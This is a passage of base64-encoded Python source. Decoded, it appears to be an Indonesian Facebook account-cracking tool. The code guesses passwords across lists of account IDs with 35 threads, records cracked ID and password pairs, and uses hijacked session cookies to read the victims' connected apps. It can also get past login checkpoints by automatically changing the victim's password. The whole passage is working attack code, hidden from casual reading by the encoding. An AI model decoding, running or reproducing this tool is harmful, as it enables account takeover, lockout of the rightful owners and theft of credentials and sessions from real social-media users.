ua18yLmdldCgiYWN0aW9uIiksZGF0YT1kYXRhXzIpO19yZXNwb25zZTJfID0gcGFyKF9yZXFfYWN0Xy50ZXh0LCJodG1sLnBhcnNlciIpO19jaGVja19vcHNpXyAgPSBbX3NhbHNhYmlsYV8udGV4dCBmb3IgX3NhbHNhYmlsYV8gaW4gX3Jlc3BvbnNlMl8uZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICBpZiBsZW4oX2NoZWNrX29wc2lfKT09MDoNCiAgICAgICAgICAgIGlmICJDaGVjayB0aGUgbG9naW4gZGV0YWlscyBzaG93bi4gV2FzIGl0IHlvdT8iIGluIF90aXRsZV9kZXZfOg0KICAgICAgICAgICAgICAgIGlmIF9hdXRvX2NoYW5nZV9wYXNzXyA9PSAnWWVzJzpjaGFuZ2VfcGFzcyh1c2VyLF9yZXFfc2VzXyxfcmVzcG9uc2VfLGxpbmtfMikNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBpZiBjZWtfcGlsaWhfb3BzaSA9PSAnWWVzJzpwcmludChmb3JtYXQpO3ByaW50KCcgICAlc+KAoiAlc09ORSBUQVAgQUNDT1VOVCclKEgsUCkpO3ByaW50KCIiKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOnByaW50KGZvcm1hdCk7cHJpbnQoJyAgICVz4oCiICVzT05FIFRBUCBBQ0NPVU5UJyUoSCxQKSkNCiAgICAgICAgICAgIGVsc2U6cGFzcw0KICAgICAgICBlbGlmIGxlbihfY2hlY2tfb3BzaV8pIT0wOg0KICAgICAgICAgICAgaWYgY2VrX3BpbGloX29wc2kgPT0gJ1llcyc6DQogICAgICAgICAgICAgICAgZm9yIF9hc3VfIGluIHJhbmdlKGxlbihfY2hlY2tfb3BzaV8pKTpfcmF0eWFfICs9IDE7anVtbGFoX29wc2kuYXBwZW5kKCJcbiAgICAgIitQK3N0cihfYXN1XysxKSsiLiAiK19jaGVja19vcHNpX1tfYXN1X10rIiAiKQ0KICAgICAgICAgICAgICAgIGp1bW9wID0gKCclcyAgIEhFUkUgQVJFICVzIE9QVElPTlMgOiAnJShQLHN0cihsZW4oanVtbGFoX29wc2kpKSkpO3ByaW50KGZvcm1hdCk7cHJpbnQoanVtb3ArIiIuam9pbihqdW1sYWhfb3BzaSkpO3ByaW50KCIiKQ0KICAgICAgICAgICAgZWxzZTpwcmludChmb3JtYXQpDQogICAgZWxzZToNCiAgICAgICAgaWYgJ3Jlc3VsdCcgaW4gY2VrX2Rldl9vcHNpOnByaW50KGZvcm1hdCk7cHJpbnQoIiVzICAgWyVzISVzXSAlc1BBU1NXT1JEIEhBUyBDSEFOR0VEIDooIiUoUCxNLFAsTSkpO3ByaW50KCcnKQ0KICAgICAgICBlbHNlOnByaW50KGZvcm1hdCkNCg0KIyMjIEdhbnRpIFBhc3N3b3JkDQpkZWYgYXV0b19nYW50aV9wYXNzKF9waXllXyk6DQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgX2dpbWFuYV8gPSBfY2ljaV9hemltdmF1XygnJXMgWyVz4oCiJXNdICVzQ0hBTkdFIE9ORSBUQVAgQUNDT1VOVCBQQVNTPyBbWS9uXSA6ICclKEgsUCxILEspKQ0KICAgICAgICBpZiBfZ2ltYW5hXyBpbiBbJyddOmphbGFuKCclcyBbJXMhJXNdICVzSU5DT1JSRUNUIENPTlRFTlQnJShNLFAsTSxQKSk7bWVudSgpDQogICAgICAgIGVsaWYgX2dpbWFuYV8gaW4gWycxJywnMDEnLCcwMDEnLCd5JywnWSddOg0KICAgICAgICAgICAgb3BlbignYXV0b19nYW50aS50eHQnLCd3Jykud3JpdGUoJ1llcycpO19uZXdwYXNzXyA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNFTlRFUiBPTkUgVEFQIFBBU1NXT1JEIDogJyUoSCxQLEgsSykpDQogICAgICAgICAgICBpZiBsZW4oX25ld3Bhc3NfKTw2OnByaW50KCclcyBbJXMhJXNdICVzU2FuZGkgTWluaW1hbCA2IEthcmFrdGVyJyUoTSxQLE0sUCkpO3RpbWUuc2xlZXAoMyk7bWVudSgpDQogICAgICAgICAgICBlbHNlOm9wZW4oJ19uZXdfcGFzc18udHh0JywndycpLndyaXRlKF9uZXdwYXNzXykNCiAgICAgICAgICAgIGlmIF9waXllXyA9PSAnWWVzJzpvcGVuKCdtdW5jdWxfb3BzaS50eHQnLCd3Jykud3JpdGUoJ1llcycpDQogICAgICAgICAgICBlbGlmIF9waXllXyA9PSAnTm8nOm9wZW4oJ211bmN1bF9vcHNpLnR4dCcsJ3cnKS53cml0ZSgnTm8nKQ0KICAgICAgICAgICAgZWxzZTpvcGVuKCdtdW5jdWxfb3BzaS50eHQnLCd3Jykud3JpdGUoJ05vJykNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsaWYgX2dpbWFuYV8gaW4gWycyJywnMDInLCcwMDInLCdOJywnbiddOm9wZW4oJ2F1dG9fZ2FudGkudHh0JywndycpLndyaXRlKCdObycpO3Bhc3MNCiAgICAgICAgZWxzZTpqYWxhbignJXMgWyVzISVzXSAlc0lOQ09SUkVDVCBDT05URU5UJyUoTSxQLE0sUCkpO21lbnUoKQ0KICAgICAgICBicmVhaw0KZGVmIGNoYW5nZV9wYXNzKHVzZXIsX3JlcV9zZXNfLF9yZXNwb25zZV8sbGlua18yKToNCiAgICBnbG9iYWwgb2ssY3ANCiAgICBmaWxlc19vayA9ICJPSy8lcy50eHQiJSh0YW5nZ2FsKQ0KICAgIHRyeTpfbmV3X3Bhc3NfID0gb3BlbignX25ld19wYXNzXy50eHQnLCdyJykucmVhZCgpDQogICAgZXhjZXB0Ol9uZXdfcGFzc18gPSAnYXppbXZhdS1fJw0KICAgIF9wYXNzd29yZF8gPSAnJy5qb2luKF9uZXdfcGFzc18pO19yZXN1bHRfb2tfID0gIlxyICVzWyVzS2FjaGktT0slc10gJXMg4oCiICVzJXMlcyAgICAgICAgICAiJShILFAsSCx1c2VyLF9wYXNzd29yZF8sdGFodW4odXNlciksUCk7X2J1dHRvbl9kZXZfID0gWyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KICAgIGZvciBfYXppbXZhdV8gaW4gX3Jlc3BvbnNlXygiaW5wdXQiKToNCiAgICAgICAgaWYgX2F6aW12YXVfLmdldCgibmFtZSIpIGluIF9idXR0b25fZGV2XzpkYXRhX2NoYW5nZV8xLnVwZGF0ZSh7X2F6aW12YXVfLmdldCgibmFtZSIpOl9hemltdmF1Xy5nZXQoInZhbHVlIil9KQ0KICAgIF9nYW50aV9wYXNzXyA9IF9yZXFfc2VzXy5wb3N0KGhvc3QrbGlua18yLmdldCgiYWN0aW9uIiksZGF0YT1kYXRhX2NoYW5nZV8xKS50ZXh0O19yZXN1bHRfcGFzc18gPSBwYXIoX2dhbnRpX3Bhc3NfLCJodG1sLnBhcnNlciIpO19saW5rXzNfID0gX3Jlc3VsdF9wYXNzXy5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSk7X2J1dHRvbl9kZXZfXzJfID0gWyJzdWJtaXRbTmV4dF0iLCJuaCIsImZiX2R0c2ciLCJqYXpvZXN0Il0NCiAgICBpZiAiQ3JlYXRlIGEgbmV3IHBhc3N3b3JkIiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIoX2dhbnRpX3Bhc3NfKSk6DQogICAgICAgIGZvciBfY2ljaV8gaW4gX3Jlc3VsdF9wYXNzXygiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIF9jaWNpXy5nZXQoIm5hbWUiKSBpbiBfYnV0dG9uX2Rldl9fMl86ZGF0YV9jaGFuZ2VfMi51cGRhdGUoe19jaWNpXy5nZXQoIm5hbWUiKTpfY2ljaV8uZ2V0KCJ2YWx1ZSIpfSkNCiAgICAgICAgZGF0YV9jaGFuZ2VfMi51cGRhdGUoeyJwYXNzd29yZF9uZXciOl9wYXNzd29yZF99KTtfc2VzX2ZpbmFsXyA9IF9yZXFfc2VzXy5wb3N0KGhvc3QrX2xpbmtfM18uZ2V0KCJhY3Rpb24iKSxkYXRhPWRhdGFfY2hhbmdlXzIpO19jb29raWVzXyA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIF9yZXFfc2VzXy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pO19fY29va2llc19fID0gY3Z0X2Nvb2tpZXMoX2Nvb2tpZXNfKTtjZWtfYXBrKF9yZXN1bHRfb2tfLF9fY29va2llc19fKTtvay5hcHBlbmQoIiVz4oCiJXMiJSh1c2VyLF9wYXNzd29yZF8pKTtfYXppbXZhdV9kYXB1bnRhXyhmaWxlc19vaywiYSsiKS53cml0ZSgiJXPigKIlc1xuIiUodXNlcixfcGFzc3dvcmRfKSk7Y3AgLT0gMTtwYXNzDQogICAgZWxzZTpwYXNzDQoNCiMjIyBDZWsgQXBsaWthc2kNCmRlZiBjZWtfYXBrKGhfb2ssX2F6aW12YXVfKToNCiAgICBhcGsgPSBbXTtzZXNfID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgY2VrX3BpbGloX29wc2kgPSBvcGVuKCdtdW5jdWxfb3BzaS50eHQnLCdyJykucmVhZCgpDQogICAgdXJsID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSI7ZGF0X2dhbWUgPSBzZXNfLmdldCh1cmwsY29va2llcz17J2Nvb2tpZSc6X2F6aW12YXVffSk7ZGF0YWdhbWUgPSBwYXIoZGF0X2dhbWUuY29udGVudCwnaHRtbC5wYXJzZXInKTtmb3JtXyAgICA9IGRhdGFnYW1lLmZpbmQoJ2Zvcm0nLG1ldGhvZD0ncG9zdCcpDQogICAgZm9yIGFzdSBpbiBmb3JtXy5maW5kX2FsbCgiaDMiKToNCiAgICAgICAgdHJ5OmNlbGVuZyA9IGFzdS5maW5kKCdzcGFuJykudGV4dDthcGsuYXBwZW5kKCdcbiAgIOKAoiAnK2NlbGVuZykNCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICB1cmwyID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIjtkYXRfZ2FtZSA9IHNlc18uZ2V0KHVybDIsY29va2llcz17J2Nvb2tpZSc6X2F6aW12YXVffSk7ZGF0YWdhbWUgPSBwYXIoZGF0X2dhbWUuY29udGVudCwnaHRtbC5wYXJzZXInKTtmb3JtXyAgICA9IGRhdGFnYW1lLmZpbmQoJ2Zvcm0nLG1ldGhvZD0ncG9zdCcpDQogICAgZm9yIGFzdSBpbiBmb3JtXy5maW5kX2FsbCgiaDMiKToNCiAgICAgICAgdHJ5OmNlbGVuZyA9IGFzdS5maW5kKCdzcGFuJykudGV4dDthcGsuYXBwZW5kKCdcbiAgIOKAoiAnK2NlbGVuZykNCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICBpZiBjZWtfcGlsaWhfb3BzaSA9PSAnWWVzJzpwcmludChoX29rKycnLmpvaW4oYXBrKSk7cHJpbnQoJycpDQogICAgZWxpZiBjZWtfcGlsaWhfb3BzaSA9PSAnTm8nOnByaW50KGhfb2srJycuam9pbihhcGspKQ0KDQojIyMgQ2VrIFRhaHVuIFBlbWJ1YXRhbg0KZGVmIHRhaHVuKGZ4KToNCiAgICBpZiAocmUuZmluZGFsbCgiW2EtekEtWl0iLHN0cihmeCkpKTp0YWh1bno9JycNCiAgICBlbHNlOg0KICAgICAgICBpZiBsZW4oZngpPT0xNToNCiAgICAgICAgICAgIGlmIGZ4WzoxMF0gaW4gWycxMDAwMDAwMDAwJ10gICAgICAgOnRhaHVueiA9ICcg4oCiIDIwMDknDQogICAgICAgICAgICBlbGlmIGZ4Wzo5XSBpbiBbJzEwMDAwMDAwMCddICAgICAgIDp0YWh1bnogPSAnIOKAoiAyMDA5Jw0KICAgICAgICAgICAgZWxpZiBmeFs6OF0gaW4gWycxMDAwMDAwMCddICAgICAgICA6dGFodW56ID0gJyDigKIgMjAwOScNCiAgICAgICAgICAgIGVsaWYgZnhbOjddIGluIFsnMTAwMDAwMCcsJzEwMDAwMDEnLCcxMDAwMDAyJywnMTAwMDAwMycsJzEwMDAwMDQnLCcxMDAwMDA1J106dGFodW56ID0gJyDigKIgMjAwOScNCiAgICAgICAgICAgIGVsaWYgZnhbOjddIGluIFsnMTAwMDAwNicsJzEwMDAwMDcnLCcxMDAwMDA4JywnMTAwMDAwOSddOnRhaHVueiA9ICcg4oCiIDIwMTAnDQogICAgICAgICAgICBlbGlmIGZ4Wzo2XSBpbiBbJzEwMDAwMSddICAgICAgICAgIDp0YWh1bnogPSAnIOKAoiAyMDEwLzIwMTEnDQogICAgICAgICAgICBlbGlmIGZ4Wzo2XSBpbiBbJzEwMDAwMicsJzEwMDAwMyddIDp0YWh1bnogPSAnIOKAoiAyMDExLzIwMTInDQogICAgICAgICAgICBlbGlmIGZ4Wzo2XSBpbiBbJzEwMDAwNCddICAgICAgICAgIDp0YWh1bnogPSAnIOKAoiAyMDEyLzIwMTMnDQogICAgICAgICAgICBlbGlmIGZ4Wzo2XSBpbiBbJzEwMDAwNScsJzEwMDAwNiddIDp0YWh1bnogPSAnIOKAoiAyMDEzLzIwMTQnDQogICAgICAgICAgICBlbGlmIGZ4Wzo2XSBpbiBbJzEwMDAwNycsJzEwMDAwOCddIDp0YWh1bnogPSAnIOKAoiAyMDE0LzIwMTUnDQogICAgICAgICAgICBlbGlmIGZ4Wzo2XSBpbiBbJzEwMDAwOSddICAgICAgICAgIDp0YWh1bnogPSAnIOKAoiAyMDE1Jw0KICAgICAgICAgICAgZWxpZiBmeFs6NV0gaW4gWycxMDAwMSddICAgICAgICAgICA6dGFodW56ID0gJyDigKIgMjAxNS8yMDE2Jw0KICAgICAgICAgICAgZWxpZiBmeFs6NV0gaW4gWycxMDAwMiddICAgICAgICAgICA6dGFodW56ID0gJyDigKIgMjAxNi8yMDE3Jw0KICAgICAgICAgICAgZWxpZiBmeFs6NV0gaW4gWycxMDAwMyddICAgICAgICAgICA6dGFodW56ID0gJyDigKIgMjAxOC8yMDE5Jw0KICAgICAgICAgICAgZWxpZiBmeFs6NV0gaW4gWycxMDAwNCddICAgICAgICAgICA6dGFodW56ID0gJyDigKIgMjAxOS8yMDIwJw0KICAgICAgICAgICAgZWxpZiBmeFs6NV0gaW4gWycxMDAwNSddICAgICAgICAgICA6dGFodW56ID0gJyDigKIgMjAyMCcNCiAgICAgICAgICAgIGVsaWYgZnhbOjVdIGluIFsnMTAwMDYnLCcxMDAwNycsJzEwMDA4J106dGFodW56ID0gJyDigKIgMjAyMScNCiAgICAgICAgICAgIGVsc2U6dGFodW56PScnDQogICAgICAgIGVsaWYgbGVuKGZ4KSBpbiBbOSwxMF06dGFodW56ID0gJyDigKIgMjAwOC8yMDA5Jw0KICAgICAgICBlbGlmIGxlbihmeCk9PTg6dGFodW56ID0gJyDigKIgMjAwNy8yMDA4Jw0KICAgICAgICBlbGlmIGxlbihmeCk9PTc6dGFodW56ID0gJyDigKIgMjAwNi8yMDA3Jw0KICAgICAgICBlbHNlOnRhaHVuej0nJw0KICAgIHJldHVybiB0YWh1bnoNCg0KIyMjIENvbnZlcnQgQ29va2llcw0KZGVmIGN2dF9jb29raWVzKHJhd19jb29raWVzKToNCiAgICBvID0ge30NCiAgICAjIF9yYXdfY29va2llc193YXJ2ZXN0XyA9IGNfdXNlcixkYXRyLGRub25jZSxmcixzYix4cw0KICAgICMgX3Jhd19jb29raWVzX2FhcF8gICAgID0gY191c2VyLGZyLHNiLHhzLGRhdHINCiAgICAjIF9jb29rZWRfY29va2llc18gICAgICA9IHNiLGRhdHIsY191c2VyLHhzLGZyDQogICAga2lrbyA9IHJhd19jb29raWVzLnJlcGxhY2UoJyAnLCcnKS5zcGxpdCgnOycpDQogICAgZm9yIHggaW4ga2lrbzoNCiAgICAgICAgeSA9IHguc3BsaXQoJz0nKVswXQ0KICAgICAgICB6ID0geC5zcGxpdCgnPScpWzFdDQogICAgICAgIG8udXBkYXRlKHt5Onp9KQ0KICAgIGNvb2tlZF9jb29raWVzID0gKCdzYj0lczsgZGF0cj0lczsgY191c2VyPSVzOyB4cz0lczsgZnI9JXMnJShvWydzYiddLG9bJ2RhdHInXSxvWydjX3VzZXInXSxvWyd4cyddLG9bJ2ZyJ10pKQ0KICAgICNfY29va2llc18gPSB7J2Nvb2tpZSc6Y29va2VkX2Nvb2tpZXN9DQogICAgI3ByaW50KGNvb2tlZF9jb29raWVzKQ0KICAgIHJldHVybiBjb29rZWRfY29va2llcw0KDQojIyMgTWV0b2RlIENyYWNrDQpkZWYgcGlsaWhfbWV0aG9kZSgpOg0KICAgIHRyeTpvcy5yZW1vdmUoJ21ldGhvZC50eHQnKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgc3RhcnRfbWV0aG9kKCkNCiAgICAgICAgcHV0ID0gX2NpY2lfYXppbXZhdV8oJyVzIFslc+KAoiVzXSAlc0NIT09TRSA6ICclKEgsUCxILEspKQ0KICAgICAgICBpZiBwdXQgaW4gWycnLCcgJywnICAnXTpjb2sgPSBvcGVuKCdtZXRob2QudHh0JywndycpO2Nvay53cml0ZSgnbWV0aG9kZV9tYmFzaWNfdjEnKTtjb2suY2xvc2UoKQ0KICAgICAgICBlbGlmIHB1dCBpbiBbJzEnLCcwMScsJzAwMScsJ2EnXTpjb2sgPSBvcGVuKCdtZXRob2QudHh0JywndycpO2Nvay53cml0ZSgnbWV0aG9kZV9hcGlfdjEnKTtjb2suY2xvc2UoKQ0KICAgICAgICBlbGlmIHB1dCBpbiBbJzInLCcwMicsJzAwMicsJ2InXTpjb2sgPSBvcGVuKCdtZXRob2QudHh0JywndycpO2Nvay53cml0ZSgnbWV0aG9kZV9hcGlfdjInKTtjb2suY2xvc2UoKQ0KICAgICAgICBlbGlmIHB1dCBpbiBbJzMnLCcwMycsJzAwMycsJ2MnXTpjb2sgPSBvcGVuKCdtZXRob2QudHh0JywndycpO2Nvay53cml0ZSgnbWV0aG9kZV9tYmFzaWNfdjEnKTtjb2suY2xvc2UoKQ0KICAgICAgICBlbGlmIHB1dCBpbiBbJzQnLCcwNCcsJzAwNCcsJ2QnXTpjb2sgPSBvcGVuKCdtZXRob2QudHh0JywndycpO2Nvay53cml0ZSgnbWV0aG9kZV9tYmFzaWNfdjInKTtjb2suY2xvc2UoKQ0KICAgICAgICBlbGlmIHB1dCBpbiBbJzUnLCcwNScsJzAwNScsJ2UnXTpjb2sgPSBvcGVuKCdtZXRob2QudHh0JywndycpO2Nvay53cml0ZSgnbWV0aG9kZV9tb2JpbGVfdjEnKTtjb2suY2xvc2UoKQ0KICAgICAgICBlbGlmIHB1dCBpbiBbJzYnLCcwNicsJzAwNicsJ2YnXTpjb2sgPSBvcGVuKCdtZXRob2QudHh0JywndycpO2Nvay53cml0ZSgnbWV0aG9kZV9tb2JpbGVfdjInKTtjb2suY2xvc2UoKQ0KICAgICAgICBlbHNlOmNvayA9IG9wZW4oJ21ldGhvZC50eHQnLCd3Jyk7Y29rLndyaXRlKCdtZXRob2RlX21iYXNpY192MScpO2Nvay5jbG9zZSgpDQogICAgICAgIGJyZWFrDQoNCiMjIyBDcmFjaw0KY2xhc3MgY3JhY2s6DQogICAgZGVmIF9faW5pdF9fKHNlbGYsZmlsZXMpOg0KICAgICAgICBnbG9iYWwgb2ssY3ANCiAgICAgICAgc2VsZi5hZGEgPSBvaztzZWxmLmNwID0gY3A7c2VsZi5rbyA9IDANCiAgICAgICAgc2VsZi5faGF5b19tYXVfcmVjb2RlXyA9ICIxMjM0NSINCiAgICAgICAgaWYgbGVuKHNlbGYuX2hheW9fbWF1X3JlY29kZV8pID09IDU6cGFzcw0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgdHJ5Om9zLnJlbW92ZShmaWxlcykNCiAgICAgICAgICAgIGV4Y2VwdDpwcmludCgiR0xPUlkiKQ0KICAgICAgICB0cnk6b3MucmVtb3ZlKCdvcHRpb25fLnR4dCcpDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIGNpayA9IG9wZW4oJ29wdGlvbl8udHh0JywndycpO2Npay53cml0ZSgnbnVsbCcpO2Npay5jbG9zZSgpDQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICBwaWxpaF9tZXRob2RlKCk7cHJpbnQoJyVzICclKE8pKTtwcmludCgnJXMgWyVz4oCiJXNdICVzQ1JBQ0sgV0lUSCBERUZBVUxUIC8gTUFOVUFMIFBBU1NXT1JEICVzWyVzZCVzLyVzbSVzXSclKEgsUCxILEIsUCxILFAsSyxQKSkNCiAgICAgICAgICAgIF9waWxpaF9zYW5kaV8gPSBfY2ljaV9hemltdmF1XygnJXMgWyVz4oCiJXNdICVzQ0hPT1NFIDogJyUoSCxQLEgsSykpDQogICAgICAgICAgICBpZiBfcGlsaWhfc2FuZGlfPT0iIjpqYWxhbignJXMgWyVzISVzXSAlc0lOQ09SUkVDVCBDT05URU5UJyUoTSxQLE0sUCkpO21lbnUoKQ0KICAgICAgICAgICAgZWxpZiBfcGlsaWhfc2FuZGlfIGluIFsnbScsJ00nLCcyJywnMDInLCcwMDInXToNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6c2VsZi5hcGsgPSBmaWxlcztzZWxmLmZzID0gX2F6aW12YXVfZGFwdW50YV8oc2VsZi5hcGspLnJlYWQoKS5zcGxpdGxpbmVzKCk7YnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpwcmludCAoIiAgICVzIiUoZSkpO2NvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIHNlbGYuZmwgPSBbXQ0KICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiBzZWxmLmZzOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OnNlbGYuZmwuYXBwZW5kKHsiaWQiOmkuc3BsaXQoIuKAoiIpWzBdfSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpwcmludCgoIiAgICVzIiVlKSk7Y29udGludWUNCiAgICAgICAgICAgICAgICBwcmludCgnJXMgWyVz4oCiJXNdICVzRVhBTVBMRSA6ICVzTklHRVJJQU4sMTIzNDU2LDc3ODg5OSclKEgsUCxILEssSCkpO3NlbGYucHdsaXN0KCk7YnJlYWsNCiAgICAgICAgICAgIGVsaWYgX3BpbGloX3NhbmRpXyBpbiBbJ2QnLCdEJywnMScsJzAxJywnMDAxJ106DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OnNlbGYuYXBrID0gZmlsZXM7c2VsZi5mcyA9IF9hemltdmF1X2RhcHVudGFfKHNlbGYuYXBrKS5yZWFkKCkuc3BsaXRsaW5lcygpO2JyZWFrDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6cHJpbnQgKCIgICAlcyIlKGUpKTtjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBzZWxmLmZsID0gW107c3RhcnRfbWV0aG9kZXp6KCk7a29waSA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNDSE9PU0UgOiAnJShILFAsSCxLKSkNCiAgICAgICAgICAgICAgICAgICAgaWYga29waSBpbiBbJyddOg0KICAgICAgICAgICAgICAgICAgICAgICAgamFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbWVudSgpDQogICAgICAgICAgICAgICAgICAgIGVsaWYga29waSBpbiBbJzEnLCcwMSddOg0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gc2VsZi5mczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6c2VsZi5mbC5hcHBlbmQoeyJpZCI6aS5zcGxpdCgi4oCiIilbMF0sInB3IjpnZW5lcmF0ZTEoaS5zcGxpdCgi4oCiIilbMV0pfSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6Y29udGludWUNCiAgICAgICAgICAgICAgICAgICAgZWxpZiBrb3BpIGluIFsnMicsJzAyJ106DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiBzZWxmLmZzOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpzZWxmLmZsLmFwcGVuZCh7ImlkIjppLnNwbGl0KCLigKIiKVswXSwicHciOmdlbmVyYXRlMihpLnNwbGl0KCLigKIiKVsxXSl9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBlbGlmIGtvcGkgaW4gWyczJywnMDMnXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHNlbGYuZnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OnNlbGYuZmwuYXBwZW5kKHsiaWQiOmkuc3BsaXQoIuKAoiIpWzBdLCJwdyI6Z2VuZXJhdGUzKGkuc3BsaXQoIuKAoiIpWzFdKX0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OmNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIGVsaWYga29waSBpbiBbJzQnLCcwNCddOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Om9zLnJlbW92ZSgncGFzcy50eHQnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpvcy5yZW1vdmUoJ2RpZ2l0cGFzcy50eHQnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhbWJhaF9wYXNzKCk7dGFtYmFoX3Bhc3NfYW5na2EoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkgaW4gc2VsZi5mczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6c2VsZi5mbC5hcHBlbmQoeyJpZCI6aS5zcGxpdCgi4oCiIilbMF0sInB3IjpnZW5lcmF0ZTQoaS5zcGxpdCgi4oCiIilbMV0pfSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6Y29udGludWUNCiAgICAgICAgICAgICAgICAgICAgZWxzZTpqYWxhbignJXMgWyVzISVzXSAlc0lOQ09SUkVDVCBDT05URU5UJyUoTSxQLE0sUCkpO21lbnUoKQ0KICAgICAgICAgICAgICAgICAgICB0cnk6b3MucmVtb3ZlKCdjcF9vcHRpb24udHh0JykNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoJyVzICclKE8pKTtwdWYgPSBfY2ljaV9hemltdmF1XygnJXMgWyVz4oCiJXNdICVzQlJJTkcgVVAgQ1AgT1BUSU9OUz8gW1kvbl0gOiAnJShILFAsSCxLKSkNCiAgICAgICAgICAgICAgICAgICAgaWYgcHVmIGluIFsnJ106amFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKTttZW51KCkNCiAgICAgICAgICAgICAgICAgICAgZWxpZiBwdWYgaW4gWycxJywnMDEnLCcwMDEnLCd5JywnWSddOmF1dG9fZ2FudGlfcGFzcygnWWVzJyk7Y29rID0gb3BlbignY3Bfb3B0aW9uLnR4dCcsJ3cnKTtjb2sud3JpdGUoJ29wc2lfY3AnKTtjb2suY2xvc2UoKTtzdGFydGVkKCk7VGhyZWFkUG9vbCgzNSkubWFwKHNlbGYuc3RhcnRfY3JhY2ssc2VsZi5mbCk7b3MucmVtb3ZlKHNlbGYuYXBrKTtfY2ljaV9jaWNpXygpO2JyZWFrDQogICAgICAgICAgICAgICAgICAgIGVsaWYgcHVmIGluIFsnMicsJzAyJywnMDAyJywnbicsJ04nXTphdXRvX2dhbnRpX3Bhc3MoJ05vJyk7Y29rID0gb3BlbignY3Bfb3B0aW9uLnR4dCcsJ3cnKTtjb2sud3JpdGUoJ251bGwnKTtjb2suY2xvc2UoKTtzdGFydGVkKCk7VGhyZWFkUG9vbCgzNSkubWFwKHNlbGYuc3RhcnRfY3JhY2ssc2VsZi5mbCk7b3MucmVtb3ZlKHNlbGYuYXBrKTtfY2ljaV9jaWNpXygpO2JyZWFrDQogICAgICAgICAgICAgICAgICAgIGVsc2U6amFsYW4oJyVzIFslcyElc10gJXNJTkNPUlJFQ1QgQ09OVEVOVCclKE0sUCxNLFApKTttZW51KCkNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6cHJpbnQoKCIgICAlcyIlZSkpDQogICAgZGVmIHB3bGlzdChzZWxmKToNCiAgICAgICAgc2VsZi5wdyA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNFTlRFUiBQQVNTV09SRCA6ICclKEssUC